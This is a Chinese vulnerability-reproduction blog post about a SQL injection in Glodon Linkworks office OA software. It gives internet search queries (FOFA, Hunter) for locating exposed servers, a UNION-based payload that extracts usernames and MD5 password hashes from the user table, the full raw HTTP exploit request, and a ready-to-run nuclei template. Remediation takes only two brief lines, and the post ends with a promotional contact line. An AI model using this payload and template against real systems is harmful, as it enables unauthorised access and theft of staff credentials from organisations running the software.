# 原创
：  【漏洞复现】广联达 Linkworks办公OA SQL注入

# 【漏洞复现】广联达 Linkworks办公OA SQL注入

### 广联达OA介绍

广联达办公OA是一款综合办公自动化解决方案，旨在提高组织内部的工作效率和协作能力。它提供了一系列功能和工具，帮助企业管理和处理日常办公任务、流程和文档。

### 资产收集

fofa：fid=”/yV4r5PdARKT4jaqLjJYqw==”或者body=”/Services/Identification/Server”<br/> hunter：web.body=”/Services/Identification/Server/“

### 漏洞点

广联达OA SQL注入漏洞位于 /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary 接口下，直接访问，页面会提示缺少参数key，说明存在SQL注入

### 漏洞复现

payload：

```
key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --

```

报文：

```
POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1
Host: xxxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 78

key=1' UNION ALL SELECT top 2 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --

```

效果如下：

### nuclei poc

```
id: guanglianda-sql

info:
  name: guanglianda-sql
  author: xxxx
  severity: info
  description: description
  reference:
    - https://
  tags: tags

requests:
  - raw:
      - |-
        POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Upgrade-Insecure-Requests: 1
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 78

        key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - value
      - type: status
        status:
          - 200

```

### nuclei验证

### 修复建议

1.访问/Webservice/IM/Config/ConfigService.asmx/GetIMDictionary 地址的时候，可以让报错信息模糊化<br/> 2.对key参数的传参进行过滤

还没看够？可以关注

[+V【zkaq222】或者下面的扫码不然通不过哦，免费领取安全学习资料包！（私聊进群一起学习，共同进步）腾讯文档-在线文档<img alt="icon-default.png?t=N7T8" src="https://csdnimg.cn/release/blog_editor_html/release2.3.6/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N7T8"/>https://docs.qq.com/doc/DYmVETWlZemh0Ymdv](https://docs.qq.com/doc/DYmVETWlZemh0Ymdv)
